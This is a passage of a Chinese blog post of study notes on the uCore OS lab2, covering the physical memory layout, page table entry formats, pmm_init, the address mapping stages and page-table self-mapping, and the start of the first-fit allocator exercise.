class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">+----------------------+ &lt;- <span class="hljs-number">0xFFFFFFFF</span>(4GB)       ----------------------------  4GB<br>|  一些保留内存，例如用于|                                保留空间<br>|   32bit设备映射空间等  |<br>+----------------------+ &lt;- 实际物理内存空间结束地址 ----------------------------<br>|                      |<br>|                      |<br>|     用于分配的         |                                 可用的空间<br>|    空闲内存区域        |<br>|                      |<br>|                      |<br>|                      |<br>+----------------------+ &lt;- 空闲内存起始地址      ----------------------------  <br>|     VPT页表存放位置      |                                VPT页表存放的空间   (4MB左右)<br>+----------------------+ &lt;- bss段结束处           ----------------------------<br>|uCore的text、data、bss |                              uCore各段的空间<br>+----------------------+ &lt;- <span class="hljs-number">0x00100000</span>(1MB)       ---------------------------- 1MB<br>|       BIOS ROM       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000F0000</span>(960KB)<br>|     16bit设备扩展ROM  |                             显存与其他ROM映射的空间<br>+----------------------+ &lt;- <span class="hljs-number">0x000C0000</span>(768KB)<br>|     CGA显存空间       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000B8000</span>            ---------------------------- 736KB<br>|        空闲内存       |<br>+----------------------+ &lt;- <span class="hljs-number">0x00011000</span>(+4KB)          uCore header的内存空间<br>| uCore的ELF header数据 |<br>+----------------------+ &lt;-<span class="hljs-number">0x00010000</span>             ---------------------------- 64KB<br>|       空闲内存        |<br>+----------------------+ &lt;- 基于bootloader的大小          bootloader的<br>|      bootloader的   |                                    内存空间<br>|     text段和data段    |<br>+----------------------+ &lt;- <span class="hljs-number">0x00007C00</span>            ---------------------------- 31KB<br>|   bootloader和uCore  |<br>|      共用的堆栈       |                                 堆栈的内存空间<br>+----------------------+ &lt;- 基于栈的使用情况<br>|     低地址空闲空间    |<br>+----------------------+ &lt;-  <span class="hljs-number">0x00000000</span>           ---------------------------- 0KB<br></code></pre></div></td></tr></table></figure><p>易知，其页表地址之上的物理内存空间是空闲的（除去保留的内存），故将该物理地址之下的物理空间对应的页表全部设置为保留(reserved)。并将这些空闲的内存全部添加进页表项中。</p></li></ul><h3 id="4-分配算法实现"><a href="#4-分配算法实现" class="headerlink" title="4.分配算法实现"></a>4.分配算法实现</h3><blockquote><p>在default_pmm.c中</p><p>实现了最简单的first-fit, 其他算法为challenge</p></blockquote><h3 id="5-段页式存储管理"><a href="#5-段页式存储管理" class="headerlink" title="5.段页式存储管理"></a>5.段页式存储管理</h3><h4 id="总体框架、分页机制图"><a href="#总体框架、分页机制图" class="headerlink" title="总体框架、分页机制图"></a>总体框架、分页机制图</h4><img src="https://i.loli.net/2021/11/20/Uvnt9ZJfP32FMbr.png" alt="image-20211120231536312" style="zoom:67%;" /><p>Page Directory is 4Kbyte-alignd, 所以CR3给的32位地址其实低12位为0, 只要把32:12和Linear address的31:22拼成一个32位地址即可:</p><img src="https://i.loli.net/2021/11/23/YQoyfDqFVTZPs6C.png" alt="image-20211120233531488" style="zoom:67%;" /><h4 id="虚拟页表和页目录表结构"><a href="#虚拟页表和页目录表结构" class="headerlink" title=" 虚拟页表和页目录表结构"></a><span id="vpt&pdt"> </span>虚拟页表和页目录表结构</h4><p>每个<strong>页表项</strong>（PTE）都由一个32位整数来存储数据，其结构如下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">      31-12      9-11     8    7    6   5   4      3    2   1   0<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br>|     Offset   | Avail | MBZ | PS | D | A | PCD | PWT | U | W | P |<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br></code></pre></div></td></tr></table></figure><ul><li>0 - <strong>P</strong>resent: 表示当前PTE所指向的物理页面是否驻留在内存中</li><li>1 - <strong>W</strong>riteable: 表示是否允许读写</li><li>2 - <strong>U</strong>ser: 表示该页的访问所需要的特权级。即User(ring 3)是否允许访问</li><li>3 - <strong>P</strong>age<strong>W</strong>rite<strong>T</strong>hough: 表示是否使用write through缓存写策略</li><li>4 - <strong>P</strong>age<strong>C</strong>ache<strong>D</strong>isable: 表示是否<strong>不对</strong>该页进行缓存</li><li>5 - <strong>A</strong>ccess: 表示该页是否已被访问过</li><li>6 - <strong>D</strong>irty: 表示该页是否已被修改</li><li>7 - <strong>P</strong>age<strong>S</strong>ize: 表示该页的大小</li><li>8 - <strong>M</strong>ust<strong>B</strong>e<strong>Z</strong>ero: 该位必须保留为0</li><li>9-11 - <strong>Avail</strong>able: 第9-11这三位并没有被内核或中断所使用，可保留给OS使用。</li><li>12-31 - Offset: 目标<strong>物理</strong>地址的高20位。</li></ul><p><strong>页目录表:</strong> </p><img src="https://i.loli.net/2021/11/23/9B45OFTQWedfhw1.png" alt="image-20211123104109784" style="zoom:80%;" /><table><thead><tr><th>Bit Position(s)</th><th>Contents</th></tr></thead><tbody><tr><td>0(P)</td><td>Present: must be 1 to reference a page table</td></tr><tr><td>1(R/W)</td><td>Read/write; if 0,writes may not be allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>2(U/S)</td><td>User/supervisor, if 0, user-mode accesses are not allowed to the 4-MByte region controlled by this entry (see Section 4.6)</td></tr><tr><td>3(PWT)</td><td>Page-level write-through; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>4(PCD)</td><td>Page-level cache disable; indirectly determines the memory type used to access the page table referenced by this entry (see Section 4.9)</td></tr><tr><td>5(A)</td><td>Accessed; indicates whether this entry has been used for linear-address translation (see Section 4.8)</td></tr><tr><td>6</td><td>lgnored</td></tr><tr><td>7(PS)</td><td>lf CR4.PSE= 1, must be 0 (otherwise, this entry maps a 4-MByte page; see Table 4-4); otherwise, ignored</td></tr><tr><td>11:8</td><td>lgnored</td></tr><tr><td>31:12</td><td><strong>Physical address</strong> of 4-KByte aligned page table referenced by this entry</td></tr></tbody></table><h3 id="6-内存初始化函数pmm-init"><a href="#6-内存初始化函数pmm-init" class="headerlink" title="6.内存初始化函数pmm_init()"></a>6.内存初始化函数pmm_init()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">pmm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 装在cr3的物理地址</span><br>    boot_cr3 = PADDR(boot_pgdir);<br>    <br>    init_pmm_manager();<br><br>    <span class="hljs-comment">// detect physical memory space in 0~KERNMSIZE, reserve already used memory,</span><br>    <span class="hljs-comment">// then use pmm-&gt;init_memmap to create free page list</span><br>    page_init();<br><br>    <span class="hljs-comment">// some simple check</span><br>    check_alloc_page();<br>    check_pgdir();<br>    <span class="hljs-keyword">static_assert</span>(KERNBASE % PTSIZE == <span class="hljs-number">0</span> &amp;&amp; KERNTOP % PTSIZE == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// recursively insert boot_pgdir in itself</span><br>    <span class="hljs-comment">// to form a virtual page table at virtual address VPT</span><br>    boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br><br>    <span class="hljs-comment">// map all physical memory to linear memory with base linear addr KERNBASE</span><br>    <span class="hljs-comment">// linear_addr KERNBASE ~ KERNBASE + KMEMSIZE = phy_addr 0 ~ KMEMSIZE</span><br>    boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="hljs-number">0</span>, PTE_W);<br><br>    <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>    <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>    gdt_init();<br><br>    <span class="hljs-comment">//now the basic virtual memory map(see memalyout.h) is established.</span><br>    <span class="hljs-comment">//check the correctness of the basic virtual memory map.</span><br>    check_boot_pgdir();<br>    print_pgdir();<br>    kmalloc_init();<span class="hljs-comment">//just print some words</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-链接脚本与地址映射"><a href="#7-链接脚本与地址映射" class="headerlink" title="7.链接脚本与地址映射"></a>7.链接脚本与地址映射</h3><ul><li><strong>edata[]和 end[]这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的起始地址或结束地址等，它们不在任何一个.S、.c或.h文件中定义。</strong> </li><li><strong>逻辑地址或虚拟地址是可执行代码在编译的时候由链接器生成的</strong> </li><li>ucore内核的链接地址==ucore内核的虚拟地址；boot loader加载ucore内核用到的加载地址==ucore内核的物理地址。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_7_phymemlab_concepts.html">-&gt;详见实验指导书&lt;-</a> </li></ul><h4 id="地址映射的四个阶段"><a href="#地址映射的四个阶段" class="headerlink" title="地址映射的四个阶段"></a>地址映射的四个阶段</h4><p>在lab2中，为了建立正确的地址映射关系，ld在链接阶段生成了ucore OS执行代码的虚拟地址，而bootloader与ucore OS协同工作，通过在运行时对地址映射的一系列“腾挪转移”，从计算机加电，启动段式管理机制，启动段页式管理机制，在段页式管理机制下运行这整个过程中，虚拟地址到物理地址的映射产生了多次变化，实现了最终的段页式映射关系：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><h4 id="最开始-链接脚本"><a href="#最开始-链接脚本" class="headerlink" title="最开始: 链接脚本"></a>最开始: 链接脚本</h4><p>tools/kernel.ld文件在lab1和lab2中的区别。在lab1中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_init)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0x100000;<br><br>            .text : &#123;<br>                       *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>这意味着在lab1中通过ld工具形成的ucore的起始虚拟地址从0x100000开始，注意：这个地址是虚拟地址。但由于lab1中建立的段地址映射关系为对等关系，所以ucore的物理地址也是从0x100000开始，而ucore的入口函数kern_init的起始地址。所以在lab1中虚拟地址、线性地址以及物理地址之间的映射关系如下：</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab1: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><p>在lab2中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_entry)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0xC0100000;<br><br>            .text : &#123;<br>                        *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>这意味着lab2中通过ld工具形成的ucore的起始虚拟地址从0xC0100000开始，注意：这个地址也是虚拟地址。入口函数为kern_entry函数（在kern/init/entry.S中）。这与lab1有很大差别。但其实在lab1和lab2中，bootloader把ucore都放在了起始物理地址为0x100000的物理内存空间。<strong>这实际上说明了ucore在lab1和lab2中采用的地址映射不同。lab2在不同阶段有不同的虚拟地址、线性地址以及物理地址之间的映射关系。</strong> </p><p>也请注意，这个起始虚拟地址的变化其实并不会影响一般的跳转和函数调用，因为它们实际上是相对跳转。但是，对于绝对寻址的全局变量的引用，就需要用REALLOC宏(即将要重新计算的地址-0xC0100000)进行一些运算来确保地址是正确的。</p><h4 id="第一个阶段"><a href="#第一个阶段" class="headerlink" title="第一个阶段"></a>第一个阶段</h4><p>（开启保护模式，创建启动段表）是bootloader阶段，即从bootloader的start函数（在boot/bootasm.S中）到执行ucore kernel的kern_entry函数之前，其虚拟地址、线性地址以及物理地址之间的映射关系与lab1的一样，即：</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab2 stage <span class="hljs-number">1</span>: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><h4 id="第二个阶段"><a href="#第二个阶段" class="headerlink" title="第二个阶段"></a>第二个阶段</h4><p>（创建初始页目录表，开启分页模式）从kern_entry函数开始，到pmm_init函数被执行之前。</p><p>编译好的ucore自带了一个**设置好的(就在entry.S里, 也不知道为什么要设置成两段映射)**页目录表和相应的页表，将0~4M的线性地址一一映射到物理地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">.align PGSIZE<br>__boot_pgdir:<br>.globl __boot_pgdir<br>    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    # 这个左移两位是乘以4的意思, 即(PDE *)__boot_pgdir + PDX(KERNBASE), <br>    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to the PDE of KERNBASE<br>    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE<br><br>.set i, 0<br>__boot_pt1:<br>.rept 1024# repeat 1024 times, a page table<br>    .long i * PGSIZE + (PTE_P | PTE_W)<br>    .set i, i + 1<br>.endr<br></code></pre></div></td></tr></table></figure><p>了解了一一映射的二级页表结构后，接下来就要使能分页机制了，这主要是通过几条汇编指令（在kern/init/entry.S中）实现的，主要做了两件事：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># load pa of boot pgdir<br>movl $REALLOC(__boot_pgdir), %eax<br>movl %eax, %cr3# 1.把页目录表的起始地址存入CR3寄存器中；<br><br># enable paging<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br>movl %eax, %cr0# 2.把cr0中的CR0_PG标志位设置上。<br></code></pre></div></td></tr></table></figure><p>执行完这几条指令后，计算机系统进入了分页模式！虚拟地址、线性地址以及物理地址之间的临时映射关系为：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lab2 stage 2 before:<br>    virt addr = linear addr = phy addr # 线性地址在0~4MB之内三者的映射关系<br>    virt addr = linear addr = phy addr + 0xC0000000 # 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系<br></code></pre></div></td></tr></table></figure><p>可以看到，其实仅仅比第一个阶段增加了下面一行的0xC0000000偏移的映射，并且作用范围缩小到了0~4M。在下一个阶段, 会将作用范围继续扩充到0~KMEMSIZE。</p><p>实际上这种映射限制了内核的大小。当内核大小超过预期的4MB （实际上是3M，因为内核从 0x100000开始编址）就可能导致打开分页之后内核crash，在某些试验中，也的确出现了这种情况。解决方法同样简单，就是正确填充更多的页目录项即可。</p><p>此时的内核（EIP）还在0~4M的低虚拟地址区域运行，而在之后，这个区域的虚拟内存是要给用户程序使用的。为此，需要使用一个绝对跳转来使内核跳转到高虚拟地址（代码在kern/init/entry.S中）：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # update eip<br>    # now, eip = 0x1.....<br>    leal next, %eax<br>    # set eip = KERNBASE + 0x1.....<br>    jmp *%eax<br>next:<br></code></pre></div></td></tr></table></figure><p>跳转完毕后，通过把boot_pgdir[0]对应的第一个页目录表项（0~4MB）清零来取消了临时的页映射关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># unmap va 0 ~ 4M, it&#x27;s temporary mapping<br>xorl %eax, %eax<br>movl %eax, __boot_pgdir<br></code></pre></div></td></tr></table></figure><p>最终，离开这个阶段时，虚拟地址、线性地址以及物理地址之间的映射关系为：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">2</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span> <span class="hljs-comment"># 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系</span><br></code></pre></div></td></tr></table></figure><p>总结来看，这一阶段的目的就是更新映射关系的同时将运行中的内核（EIP）从低虚拟地址“迁移”到高虚拟地址，而不造成伤害。</p><p>不过，这还不是我们期望的映射关系，因为它仅仅映射了0~4MB。对于段表而言，也缺少了运行ucore所需的用户态段描述符和TSS（段）描述符相应表项。</p><h4 id="第三个阶段"><a href="#第三个阶段" class="headerlink" title="第三个阶段"></a>第三个阶段</h4><p>（完善段表和页表）从pmm_init函数被调用开始。pmm_init函数将页目录表项补充完成（从0~4M扩充到0~KMEMSIZE）。然后，更新了段映射机制，使用了一个新的段表。这个新段表除了包括内核态的代码段和数据段描述符，还包括用户态的代码段和数据段描述符以及TSS（段）的描述符。理论上可以在第一个阶段，即bootloader阶段就将段表设置完全，然后在此阶段继续使用，但这会导致内核的代码和bootloader的代码产生过多的耦合，于是就有了目前的设计。</p><p>这时形成了我们期望的虚拟地址、线性地址以及物理地址之间的映射关系：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">3</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><p>段表相应表项和TSS也被设置妥当。</p><h3 id="自映射机制"><a href="#自映射机制" class="headerlink" title="自映射机制"></a>自映射机制</h3><p><strong>4GB内存都有用到吗?</strong> </p><p>众所周知, 从物理地址空间中的每一个block分配page table之后(在default_init_memmap完成), 虚拟地址空间是一片连续的空间, 从0xC0000000开始, 大小为0x38000000=896MB, 并没有用完全部4GB的地址空间, 这只是一个设定, 可以根据情况进行改变.<br>memlayout.h中定义了常量`</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE 0xC0000000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMEMSIZE 0x38000000 <span class="hljs-comment">// the maximum amount of physical memory</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNTOP (KERNBASE + KMEMSIZE)</span><br><span class="hljs-comment">//------------------------------</span><br>define VPT<span class="hljs-number">0xFAC00000</span><br></code></pre></div></td></tr></table></figure><p><strong>自映射是什么?</strong> </p><p>注意到每一个4KB页表中有1k个4B的pte, 每个pte指向物理空间中4KB的page, 整个page table指向了虚拟空间中4MB大小的pages. 如果我们把映射4GB空间的4MB页表放在4MB对齐的虚拟地址处, 那么可以想到有一个页表刚好映射他所在的4MB区域, 于是就充当了页目录表的功能.</p><p>具体而言，ucore是这样设计的，首先设置了一个常量（memlayout.h）：</p><p>VPT=<strong>0xFAC00000</strong>， 这个地址的二进制表示为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">1111</span> <span class="hljs-number">1010</span> <span class="hljs-number">11</span>|<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>| <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span><span class="hljs-comment">//管道符号表示虚拟地址的三个部分</span><br></code></pre></div></td></tr></table></figure><p>高10位为1111 1010 11，即10进制的1003，中间10位为0，低12位也为0。在pmm.c中有两个全局初始化变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">pte_t</span> * <span class="hljs-keyword">const</span> vpt = (<span class="hljs-keyword">pte_t</span> *)VPT;<br><span class="hljs-keyword">pde_t</span> * <span class="hljs-keyword">const</span> vpd = (<span class="hljs-keyword">pde_t</span> *)PGADDR(PDX(VPT), PDX(VPT), <span class="hljs-number">0</span>);<span class="hljs-comment">//这个宏用来拼接虚拟地址</span><br></code></pre></div></td></tr></table></figure><p>并在pmm_init函数执行了如下语句：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br></code></pre></div></td></tr></table></figure><p>这些变量和语句有何特殊含义呢？<strong>其实vpd变量的值就是页目录表的起始虚地址0xFAFEB000</strong>，且它的高10位和中10位是相等的，都是10进制的1003。当执行了上述语句，就确保了vpd变量的值就是页目录表的起始虚地址，且vpt是页目录表中第一个目录表项指向的页表的起始虚地址。此时描述内核虚拟空间的页目录表的虚地址为0xFAFEB000，大小为4KB。页表的理论连续虚拟地址空间0xFAC00000~0xFB000000，大小为4MB。因为这个连续地址空间的大小为4MB，可有1M个PTE，即可映射4GB的地址空间。</p><p><strong>有什么好处?</strong> </p><p>在页机制建立好后, 如果我们这时需要按虚拟地址的地址顺序显示整个页目录表和页表的内容，则要查找页目录表的页目录表项内容，根据页目录表项内容找到页表的物理地址**(pdt和pt为什么存放的是物理地址?)**，再转换成对应的虚地址，然后访问页表的虚地址，搜索整个页表的每个页目录项。这样过程比较繁琐。</p><p>但是利用以上的方法, 通过连续扫描这特定的4MB虚拟地址空间，就很容易访问每个页目录表项和页表项内容。</p><p>在pmm.c中的函数<code>print_pgdir</code>就是基于ucore的页表自映射方式完成了对整个页目录表和页表的内容扫描和打印。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//print_pgdir - print the PDT&amp;PT</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">print_pgdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    cprintf(<span class="hljs-string">&quot;-------------------- BEGIN --------------------\n&quot;</span>);<br>    <span class="hljs-keyword">size_t</span> left, right = <span class="hljs-number">0</span>, perm;<br>    <span class="hljs-comment">//找出一个页目录表权限相同的range, 存在left和right中</span><br>    <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(<span class="hljs-number">0</span>, NPDEENTRY, right, vpd, &amp;left, &amp;right)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//几个数字分别代表range中条目数量,虚地址范围,大小,权限</span><br>        cprintf(<span class="hljs-string">&quot;PDE(%03x) %08x-%08x %08x %s\n&quot;</span>, right - left,<br>                left * PTSIZE, right * PTSIZE, (right - left) * PTSIZE, perm2str(perm));<br>        <span class="hljs-keyword">size_t</span> l, r = left * NPTEENTRY;<br>        <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(left * NPTEENTRY, right * NPTEENTRY, r, vpt, &amp;l, &amp;r)) != <span class="hljs-number">0</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;  |-- PTE(%05x) %08x-%08x %08x %s\n&quot;</span>, r - l,<br>                    l * PGSIZE, r * PGSIZE, (r - l) * PGSIZE, perm2str(perm));<br>        &#125;<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;--------------------- END ---------------------\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="练习3-2"><a href="#练习3-2" class="headerlink" title="练习3+2"></a>练习3+2</h2><h3 id="练习一-1"><a href="#练习一-1" class="headerlink" title="练习一"></a>练习一</h3><blockquote><p>实现 first-fit 连续物理内存分配算法</p></blockquote><ul><li>简单的修改了几个函数, 甚至不用全都改, 不过free函数我调试了好久</li></ul><h4 id="default-init-memmap"><a href="#default-init-memmap" class="headerlink" title="default_init_memmap"></a>default_init_memmap</h4><ul><li><p>该函数将新页面插入链表时，没有按照地址顺序插入</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>故需要修改该行代码，使其按地址顺序插入至双向链表中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add_before(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-alloc-pages"><a href="#default-alloc-pages" class="headerlink" title="default_alloc_pages"></a>default_alloc_pages</h4><ul><li><p>在原先的代码中，当获取到了一个大小足够大的页面地址时，程序会先将该页头从链表中断开，切割，并将剩余空间放回链表中。但将<em>剩余空间放回链表</em>时，并没有按照地址顺序插入链表。</p><blockquote><p>连续空闲页面中的第一个页称为页头，page 